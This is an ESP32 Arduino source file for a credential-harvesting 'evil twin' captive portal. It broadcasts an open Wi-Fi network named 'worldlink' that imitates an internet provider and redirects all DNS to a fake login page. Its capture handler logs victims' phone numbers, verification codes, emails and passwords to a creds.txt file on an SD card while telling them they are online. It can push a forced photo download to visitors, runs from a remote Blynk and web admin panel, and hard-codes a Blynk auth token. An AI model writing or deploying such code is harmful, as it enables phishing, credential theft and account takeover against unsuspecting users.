/**
 * @file CaptivePortalController.ino
 * @brief ESP32 Captive Portal with Blynk 2.0, SD card storage, and web admin panel.
 * 
 * Features:
 * - Captive portal (AP mode) to capture phone/email credentials.
 * - Optional download of a photo from SD card.
 * - Web admin interface (terminal style) to control portal and download.
 * - Blynk integration for remote control.
 * - Serial command interface.
 */

#define BLYNK_TEMPLATE_ID "TMPL6jWYeX6NR"
#define BLYNK_TEMPLATE_NAME "Jaffinator CP"
#define BLYNK_AUTH_TOKEN "0-zBQSs2oy7PawCGEKAp6Mx_Wv-oMLsq"

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPI.h>
#include <SD.h>
#include <BlynkSimpleEsp32.h>

/* ==================== Wi‑Fi Credentials ==================== */
char ssid[] = " ";
char pass[] = " ";

/* ==================== SD Card SPI Pins ==================== */
const int sd_sck  = 18;
const int sd_miso = 15;
const int sd_mosi = 23;
const int sd_cs   = 5;

/* ==================== Access Point Settings ==================== */
const char* ap_ssid = "worldlink";
const IPAddress ap_ip(192, 168, 4, 1);
const IPAddress netmask(255, 255, 255, 0);

/* ==================== Web & DNS Server ==================== */
DNSServer dnsServer;
WebServer server(80);

/* ==================== HTML buffer (loaded from SD) ==================== */
char* index_html = nullptr;
const size_t MAX_HTML_SIZE = 45000;
const char* html_filename = "/myworldink.html";

/* ==================== Control Flags ==================== */
bool portalActive = false;    // Captive portal running?
bool downloadEnabled = false; // Allow photo download?

/* ==================== Function Prototypes ==================== */
bool loadHtmlFromSD();
void handlePortal();
void handleCapture();
void handleAccept();
void writeCredToSD(String data);
void handleDownloadPhoto();
void startPortal();
void stopPortal();
void showHelp();
void handleAdmin();
void handleApiPortal();
void handleApiDownload();
void handleApiStatus();

/* ==================== Blynk Handlers ==================== */
/**
 * @brief Blynk virtual pin V0 – toggle captive portal.
 */
BLYNK_WRITE(V0) {
  if (param.asInt() == 1) startPortal();
  else stopPortal();
}

/**
 * @brief Blynk virtual pin V1 – toggle download permission.
 */
BLYNK_WRITE(V1) {
  downloadEnabled = (param.asInt() == 1);
  Serial.printf("Download %s\n", downloadEnabled ? "ENABLED" : "DISABLED");
}

/* ==================== Setup ==================== */
void setup() {
  Serial.begin(115200);
  while (!Serial && millis() < 2000) delay(10);

  Serial.println("\n=== Captive Portal Controller + Blynk 2.0 ===");

  // ---- Initialise SD card ----
  SPI.begin(sd_sck, sd_miso, sd_mosi, sd_cs);
  if (!SD.begin(sd_cs, SPI, 10000000)) {
    Serial.println("❌ SD Card mount failed!");
  } else {
    loadHtmlFromSD();
  }

  // ---- Connect to home Wi‑Fi (STA) ----
  WiFi.mode(WIFI_AP_STA);
  WiFi.begin(ssid, pass);
  Serial.print("📶 Connecting to home Wi‑Fi");
  int tries = 0;
  while (WiFi.status() != WL_CONNECTED && tries < 30) {
    delay(500);
    Serial.print(".");
    tries++;
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n✅ Home Wi‑Fi connected! IP: " + WiFi.localIP().toString());
  } else {
    Serial.println("\n⚠️ Home Wi‑Fi failed – Blynk will not work.");
  }

  // ---- Blynk ----
  Blynk.config(BLYNK_AUTH_TOKEN);
  if (WiFi.status() == WL_CONNECTED) {
    Blynk.connect();
    Serial.println("🔵 Blynk connected");
  }

  // ---- Web server routes ----
  server.on("/", HTTP_GET, handlePortal);
  server.on("/capture", HTTP_POST, handleCapture);
  server.on("/accept", HTTP_POST, handleAccept);
  server.on("/download_photo", HTTP_GET, handleDownloadPhoto);
  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/api/portal", HTTP_GET, handleApiPortal);
  server.on("/api/download", HTTP_GET, handleApiDownload);
  server.on("/api/status", HTTP_GET, handleApiStatus);
  server.onNotFound(handlePortal);
  server.begin();
  Serial.println("🌐 Web server started");

  portalActive = false;
  downloadEnabled = false;

  Serial.println("\n✅ Ready. Use Blynk web dashboard or Serial commands.");
  showHelp();
  Serial.print("\n> ");
}

/* ==================== Main Loop ==================== */
void loop() {
  Blynk.run();

  if (portalActive) {
    dnsServer.processNextRequest();
    server.handleClient();
  } else {
    server.handleClient();
  }

  // ---- Serial command handling ----
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toLowerCase();
    Serial.println("> " + cmd);

    if (cmd == "portal on") {
      startPortal();
    } else if (cmd == "portal off") {
      stopPortal();
    } else if (cmd == "download on") {
      downloadEnabled = true;
      Serial.println("✅ Download ENABLED");
      Blynk.virtualWrite(V1, 1);
    } else if (cmd == "download off") {
      downloadEnabled = false;
      Serial.println("❌ Download DISABLED");
      Blynk.virtualWrite(V1, 0);
    } else if (cmd == "status") {
      Serial.printf("Portal: %s | Download: %s\n",
                    portalActive ? "ON" : "OFF",
                    downloadEnabled ? "ON" : "OFF");
    } else if (cmd == "help") {
      showHelp();
    } else {
      Serial.println("Unknown. Type 'help' for commands.");
    }
    Serial.print("\n> ");
  }

  yield();
}

/* ==================== Portal Control ==================== */

/**
 * @brief Start the captive portal (AP + DNS).
 */
void startPortal() {
  if (portalActive) {
    Serial.println("⚠️ Already running");
    return;
  }
  if (!WiFi.softAP(ap_ssid)) {
    WiFi.softAPConfig(ap_ip, ap_ip, netmask);
    WiFi.softAP(ap_ssid);
    Serial.printf("📶 AP '%s' started (IP: %s)\n", ap_ssid, WiFi.softAPIP().toString().c_str());
  }
  dnsServer.start(53, "*", ap_ip);
  Serial.println("📡 DNS server started");
  portalActive = true;
  Serial.println("✅ Portal ACTIVE");
  Blynk.virtualWrite(V0, 1);
}

/**
 * @brief Stop the captive portal.
 */
void stopPortal() {
  if (!portalActive) {
    Serial.println("⚠️ Not running");
    return;
  }
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  portalActive = false;
  Serial.println("✅ Portal stopped");
  Blynk.virtualWrite(V0, 0);
}

/* ==================== Web Handlers ==================== */

/**
 * @brief Serve the captive portal page (from SD or fallback).
 */
void handlePortal() {
  if (index_html) {
    server.send(200, "text/html", index_html);
    return;
  }

  // Fallback simple HTML (identical to original)
  String fallback = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1"><title>WorldLink</title>
<style>
  body{font-family:Arial;text-align:center;padding:40px;background:#0f0f1a;color:#fff;}
  .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:999;}
  .modal-box{background:#fff;color:#333;border-radius:20px;padding:30px;max-width:340px;width:90%;text-align:center;}
  .btn{background:#FFD600;border:none;padding:12px 40px;border-radius:30px;font-weight:bold;font-size:16px;cursor:pointer;}
</style>
</head>
<body>
<div class="modal" id="popup">
  <div class="modal-box">
    <h2>🌐 Welcome to WorldLink</h2>
    <p>Click below to start your free session.</p>
    <button class="btn" onclick="downloadAndClose()">Continue →</button>
  </div>
</div>
<script>
function downloadAndClose() {
  var a = document.createElement('a');
  a.href = '/download_photo';
  a.download = 'photo.png';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  document.getElementById('popup').style.display = 'none';
}
</script>
</body>
</html>
)rawliteral";
  server.send(200, "text/html", fallback);
}

/**
 * @brief Handle credential capture (POST /capture).
 */
void handleCapture() {
  String phone = server.arg("phone");
  String code  = server.arg("code");
  String email = server.arg("email");
  String pass  = server.arg("password");

  // Build timestamp
  unsigned long secs = millis() / 1000;
  unsigned long mins = secs / 60;
  unsigned long hrs  = mins / 60;
  unsigned long days = hrs / 24;
  char ts[30];
  snprintf(ts, sizeof(ts), "%lud %02lu:%02lu:%02lu", days, hrs % 24, mins % 60, secs % 60);

  String logLine = "[" + String(ts) + "] ";
  if (phone.length() > 0 && code.length() > 0) {
    logLine += "Phone: " + phone + " | Code: " + code;
  } else if (email.length() > 0 && pass.length() > 0) {
    logLine += "Email: " + email + " | Password: " + pass;
  } else {
    logLine += "Data: ";
    for (int i = 0; i < server.args(); i++) {
      logLine += server.argName(i) + "=" + server.arg(i) + " ";
    }
  }
  Serial.println("📥 " + logLine);
  writeCredToSD(logLine);

  String success = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width'>";
  success += "<style>body{font-family:Arial;text-align:center;padding:50px;}</style></head>";
  success += "<body><h1>✅ Connected</h1><p>You are now online. Enjoy!</p>";
  success += "<script>setTimeout(function(){ window.location.href='http://192.168.4.1/'; }, 3000);</script></body></html>";
  server.send(200, "text/html", success);
}

/**
 * @brief Handle the "accept" button (simply calls handleCapture if args present).
 */
void handleAccept() {
  if (server.args() > 0) {
    handleCapture();
  } else {
    server.send(200, "text/html", "<h1>Success</h1><p>Session activated.</p>");
  }
}

/**
 * @brief Serve the photo from SD card (if enabled).
 */
void handleDownloadPhoto() {
  if (!downloadEnabled) {
    server.send(404, "text/plain", "Download disabled");
    return;
  }
  File file = SD.open("/photo.png");
  if (!file) {
    server.send(404, "text/plain", "File not found");
    return;
  }
  server.sendHeader("Content-Type", "image/png");
  server.sendHeader("Content-Disposition", "attachment; filename=photo.png");
  server.streamFile(file, "image/png");
  file.close();
  Serial.println("📸 photo.png downloaded");
}

/* ==================== Admin Panel (Terminal Style) ==================== */

/**
 * @brief Serve the terminal‑style admin control panel.
 */
void handleAdmin() {
  String page = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Control Panel // terminal</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

    :root {
      --bg: #050805;
      --panel: #0a120a;
      --green: #39ff6a;
      --green-dim: #1c7a37;
      --green-faint: #0f3d1c;
      --amber: #ffb000;
      --red: #ff3b3b;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      height: 100%;
      background: radial-gradient(ellipse at center, #081208 0%, #020402 100%);
      font-family: 'Share Tech Mono', monospace;
      color: var(--green);
      overflow: hidden;
    }

    .crt-wrap {
      position: relative;
      height: 100vh;
      padding: 18px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    /* scanlines + flicker */
    .crt-wrap::before {
      content: "";
      position: absolute; inset: 0;
      background: repeating-linear-gradient(
        to bottom,
        rgba(0,0,0,0) 0px,
        rgba(0,0,0,0) 1px,
        rgba(0,0,0,0.18) 2px,
        rgba(0,0,0,0.18) 3px
      );
      pointer-events: none;
      z-index: 5;
      mix-blend-mode: multiply;
    }
    .crt-wrap::after {
      content: "";
      position: absolute; inset: 0;
      background: radial-gradient(ellipse at center, rgba(57,255,106,0.05) 0%, rgba(0,0,0,0.55) 100%);
      pointer-events: none;
      z-index: 6;
      animation: flicker 6s infinite;
    }
    @keyframes flicker {
      0%,96%,100%{ opacity:1; }
      97%{ opacity:0.85; }
      98%{ opacity:1; }
      99%{ opacity:0.9; }
    }

    /* ----- top bar ----- */
    .topbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      border: 1px solid var(--green-dim);
      padding: 6px 14px;
      background: linear-gradient(180deg, rgba(57,255,106,0.05), transparent);
      font-size: 13px;
      letter-spacing: 1px;
      z-index: 10;
      flex-shrink: 0;
    }
    .topbar .brand {
      font-family: 'Share Tech Mono', monospace;
      font-size: 22px;
      letter-spacing: 3px;
      color: var(--green);
      text-shadow: 0 0 8px rgba(57,255,106,0.6);
    }
    .topbar .brand span { color: var(--amber); }
    .stat-cluster { display: flex; gap: 20px; align-items: center; }
    .stat { display: flex; flex-direction: column; align-items: flex-end; font-size: 11px; color: var(--green-dim); }
    .stat b { color: var(--green); font-size: 13px; font-weight: normal; }

    .dot {
      width: 8px; height: 8px; border-radius: 50%;
      display: inline-block; margin-right: 6px;
      background: var(--green-dim);
      box-shadow: 0 0 6px var(--green-dim);
    }
    .dot.live { background: var(--green); box-shadow: 0 0 8px var(--green); animation: pulse 1.4s infinite; }
    .dot.warn { background: var(--red); box-shadow: 0 0 8px var(--red); }
    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.35;} }

    /* ----- main console ----- */
    .console {
      flex: 1;
      border: 1px solid var(--green-dim);
      background: #020602;
      display: flex;
      flex-direction: column;
      min-height: 0;
      box-shadow: inset 0 0 40px rgba(57,255,106,0.05);
      z-index: 10;
      overflow: hidden;
    }
    .console-head {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 6px 14px;
      border-bottom: 1px solid var(--green-faint);
      font-size: 11px;
      color: var(--green-dim);
      flex-shrink: 0;
    }
    .console-head .path { color: var(--green); }

    .console-body {
      flex: 1;
      overflow-y: auto;
      padding: 14px;
      font-size: 13px;
      line-height: 1.55;
    }
    .console-body::-webkit-scrollbar { width: 8px; }
    .console-body::-webkit-scrollbar-thumb { background: var(--green-faint); }

    .line {
      white-space: pre-wrap;
      word-break: break-word;
      opacity: 0;
      animation: appear 0.15s forwards;
    }
    @keyframes appear { to { opacity: 1; } }
    .line.ok { color: var(--green); }
    .line.info { color: #63e0d8; }
    .line.warn { color: var(--amber); }
    .line.err { color: var(--red); }
    .line.dim { color: var(--green-dim); }

    .prompt-row {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 8px 14px;
      border-top: 1px solid var(--green-faint);
      font-size: 13px;
      flex-shrink: 0;
      background: rgba(0,0,0,0.3);
    }
    .prompt-row .sym { color: var(--amber); }
    .cursor {
      width: 8px; height: 16px;
      background: var(--green);
      animation: blink 1s steps(1) infinite;
    }
    @keyframes blink { 50%{ opacity:0; } }

    /* ----- controls at bottom ----- */
    .controls {
      display: flex;
      align-items: center;
      gap: 12px;
      border: 1px solid var(--green-dim);
      padding: 10px 14px;
      background: linear-gradient(180deg, rgba(57,255,106,0.04), transparent);
      flex-shrink: 0;
      z-index: 10;
      flex-wrap: wrap;
    }
    .btn {
      font-family: 'Share Tech Mono', monospace;
      background: transparent;
      border: 1px solid var(--green-dim);
      color: var(--green);
      padding: 8px 16px;
      font-size: 13px;
      letter-spacing: 1px;
      cursor: pointer;
      transition: all 0.15s ease;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .btn:hover { background: rgba(57,255,106,0.08); border-color: var(--green); }
    .btn:active { transform: translateY(1px); }
    .btn.start { color: var(--green); border-color: var(--green); }
    .btn.start:hover { box-shadow: 0 0 14px rgba(57,255,106,0.5); }
    .btn.stop { color: var(--red); border-color: var(--red); }
    .btn.stop:hover { box-shadow: 0 0 14px rgba(255,59,59,0.5); background: rgba(255,59,59,0.08); }
    .btn.sync { color: var(--amber); border-color: var(--amber); }
    .btn.sync:hover { box-shadow: 0 0 14px rgba(255,176,0,0.4); background: rgba(255,176,0,0.08); }
    .btn:disabled { opacity: 0.3; cursor: not-allowed; box-shadow: none !important; }

    .toggle-group {
      display: flex;
      align-items: center;
      gap: 20px;
      margin-left: auto;
    }
    .toggle-item {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 12px;
      color: var(--green-dim);
    }
    .toggle-item .label { color: var(--green); letter-spacing: 1px; }
    .toggle-item .badge {
      font-size: 10px;
      padding: 2px 8px;
      border-radius: 4px;
      border: 1px solid rgba(0,255,65,0.15);
      color: #446644;
      background: rgba(0,255,65,0.05);
      letter-spacing: 0.5px;
    }
    .toggle-item .badge.on { color: var(--green); border-color: rgba(0,255,65,0.5); background: rgba(0,255,65,0.1); }
    .toggle-item .badge.off { color: #994444; border-color: rgba(255,50,50,0.3); background: rgba(255,0,0,0.05); }

    /* custom toggle switch */
    .toggle-switch {
      position: relative;
      width: 44px;
      height: 24px;
      flex-shrink: 0;
      cursor: pointer;
    }
    .toggle-switch input {
      opacity: 0;
      width: 0;
      height: 0;
      position: absolute;
    }
    .slider {
      position: absolute;
      inset: 0;
      background: #111;
      border: 1px solid #223322;
      border-radius: 24px;
      transition: 0.25s;
      display: flex;
      align-items: center;
      padding: 0 3px;
    }
    .slider::before {
      content: '';
      height: 16px;
      width: 16px;
      background: #2a3d2a;
      border-radius: 50%;
      transition: 0.25s;
    }
    input:checked + .slider {
      border-color: #00cc33;
      background: #001800;
    }
    input:checked + .slider::before {
      transform: translateX(20px);
      background: var(--green);
    }

    .last-sync {
      font-size: 10px;
      color: #223322;
      letter-spacing: 0.3px;
      margin-left: 10px;
    }

    @media (max-width: 700px) {
      .controls { flex-direction: column; align-items: stretch; }
      .toggle-group { margin-left: 0; justify-content: space-around; }
      .topbar .brand { font-size: 16px; }
    }
  </style>
</head>
<body>
<div class="crt-wrap">

  <div class="topbar">
    <div class="brand">CTRL<span>//</span>PANEL</div>
    <div class="stat-cluster">
      <div class="stat"><span><span class="dot live"></span>NODE</span><b id="nodeName">ESP32</b></div>
      <div class="stat">IP<b id="espIp">192.168.4.1</b></div>
      <div class="stat">CLOCK<b id="clock">00:00:00</b></div>
    </div>
  </div>

  <div class="console">
    <div class="console-head">
      <span>proc <span class="path">/var/log/control.log</span></span>
      <span id="lineCount">0 lines</span>
    </div>
    <div class="console-body" id="consoleBody"></div>
    <div class="prompt-row">
      <span class="sym">ctrl@panel:~$</span>
      <span class="cursor"></span>
    </div>
  </div>

  <div class="controls">
    <button class="btn sync" id="syncBtn"><span>⟳</span> SYNC</button>
    <span class="last-sync" id="lastSync">not synced</span>

    <div class="toggle-group">
      <div class="toggle-item">
        <span class="label">PORTAL</span>
        <span class="badge off" id="portalBadge">OFF</span>
        <label class="toggle-switch">
          <input type="checkbox" id="portalToggle">
          <span class="slider"></span>
        </label>
      </div>
      <div class="toggle-item">
        <span class="label">DOWNLOAD</span>
        <span class="badge off" id="downloadBadge">OFF</span>
        <label class="toggle-switch">
          <input type="checkbox" id="downloadToggle">
          <span class="slider"></span>
        </label>
      </div>
    </div>
  </div>

</div>

<script>
  const consoleBody = document.getElementById('consoleBody');
  const lineCountEl = document.getElementById('lineCount');
  const portalToggle = document.getElementById('portalToggle');
  const downloadToggle = document.getElementById('downloadToggle');
  const portalBadge = document.getElementById('portalBadge');
  const downloadBadge = document.getElementById('downloadBadge');
  const syncBtn = document.getElementById('syncBtn');
  const lastSync = document.getElementById('lastSync');
  const espIp = document.getElementById('espIp');
  const clockEl = document.getElementById('clock');

  let lineTotal = 0;

  function timestamp() {
    const d = new Date();
    return d.toTimeString().slice(0,8);
  }

  function addLine(cls, text) {
    const div = document.createElement('div');
    div.className = 'line ' + cls;
    div.textContent = text;
    consoleBody.appendChild(div);
    consoleBody.scrollTop = consoleBody.scrollHeight;
    lineTotal++;
    lineCountEl.textContent = lineTotal + ' lines';
  }

  function updateUI(portal, download) {
    portalToggle.checked = portal;
    portalBadge.textContent = portal ? 'ON' : 'OFF';
    portalBadge.className = 'badge ' + (portal ? 'on' : 'off');

    downloadToggle.checked = download;
    downloadBadge.textContent = download ? 'ON' : 'OFF';
    downloadBadge.className = 'badge ' + (download ? 'on' : 'off');

    const now = new Date();
    lastSync.textContent = 'sync: ' + now.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
  }

  async function fetchStatus() {
    syncBtn.disabled = true;
    try {
      const res = await fetch('/api/status');
      const data = await res.json();
      updateUI(data.portal, data.download);
      addLine('dim', '[sync] status fetched');
    } catch (e) {
      addLine('err', '[sync] failed to fetch status');
    } finally {
      syncBtn.disabled = false;
    }
  }

  async function sendCommand(type, state) {
    const action = state ? 'on' : 'off';
    try {
      const res = await fetch('/api/' + type + '?state=' + action);
      if (!res.ok) throw new Error('HTTP ' + res.status);
      const msg = type.toUpperCase() + ' ' + (state ? 'activated' : 'deactivated');
      addLine('ok', '[cmd] ' + msg);
      await fetchStatus();
    } catch (e) {
      addLine('err', '[cmd] ' + type + ' toggle failed');
    }
  }

  portalToggle.addEventListener('change', function() {
    sendCommand('portal', this.checked);
  });

  downloadToggle.addEventListener('change', function() {
    sendCommand('download', this.checked);
  });

  syncBtn.addEventListener('click', function() {
    addLine('info', '[sync] manual sync requested');
    fetchStatus();
  });

  function tickClock() {
    clockEl.textContent = timestamp();
  }
  setInterval(tickClock, 1000);
  tickClock();

  espIp.textContent = window.location.hostname;
  addLine('dim', 'system ready. use toggles to control portal and download.');
  fetchStatus();
  setInterval(fetchStatus, 5000);
</script>
</body>
</html>
  )rawliteral";
  server.send(200, "text/html", page);
}

/* ==================== API Endpoints ==================== */

/**
 * @brief API to start/stop portal.
 * @param state "on" or "off"
 */
void handleApiPortal() {
  String state = server.arg("state");
  if (state == "on") {
    startPortal();
    server.send(200, "text/plain", "Portal ON");
  } else if (state == "off") {
    stopPortal();
    server.send(200, "text/plain", "Portal OFF");
  } else {
    server.send(400, "text/plain", "Usage: ?state=on|off");
  }
}

/**
 * @brief API to enable/disable download.
 * @param state "on" or "off"
 */
void handleApiDownload() {
  String state = server.arg("state");
  if (state == "on") {
    downloadEnabled = true;
    Blynk.virtualWrite(V1, 1);
    server.send(200, "text/plain", "Download ENABLED");
  } else if (state == "off") {
    downloadEnabled = false;
    Blynk.virtualWrite(V1, 0);
    server.send(200, "text/plain", "Download DISABLED");
  } else {
    server.send(400, "text/plain", "Usage: ?state=on|off");
  }
}

/**
 * @brief Return current status as JSON.
 */
void handleApiStatus() {
  String json = "{";
  json += "\"portal\":" + String(portalActive ? "true" : "false") + ",";
  json += "\"download\":" + String(downloadEnabled ? "true" : "false");
  json += "}";
  server.send(200, "application/json", json);
}

/* ==================== SD Card Helpers ==================== */

/**
 * @brief Append a line to /creds.txt on SD card.
 */
void writeCredToSD(String data) {
  File file = SD.open("/creds.txt", FILE_APPEND);
  if (!file) {
    Serial.println("❌ Failed to open /creds.txt");
    return;
  }
  file.println(data);
  file.close();
  Serial.println("💾 Saved to SD");
}

/**
 * @brief Load HTML from SD into index_html buffer.
 * @return true if successful.
 */
bool loadHtmlFromSD() {
  File file = SD.open(html_filename);
  if (!file) {
    Serial.printf("⚠️ HTML file '%s' not found\n", html_filename);
    return false;
  }
  size_t size = file.size();
  if (size > MAX_HTML_SIZE) {
    Serial.printf("⚠️ HTML too large (%u bytes)\n", size);
    file.close();
    return false;
  }
  if (index_html) free(index_html);
  index_html = (char*)malloc(size + 1);
  if (!index_html) {
    Serial.println("⚠️ Memory allocation failed");
    file.close();
    return false;
  }
  file.readBytes(index_html, size);
  index_html[size] = '\0';
  file.close();
  return true;
}

/* ==================== Help (Serial) ==================== */

/**
 * @brief Print available serial commands.
 */
void showHelp() {
  Serial.println("\nCommands:");
  Serial.println("  portal on   - start captive portal");
  Serial.println("  portal off  - stop captive portal");
  Serial.println("  download on - enable image download");
  Serial.println("  download off- disable image download");
  Serial.println("  status      - show current state");
  Serial.println("  help        - show this list");
}
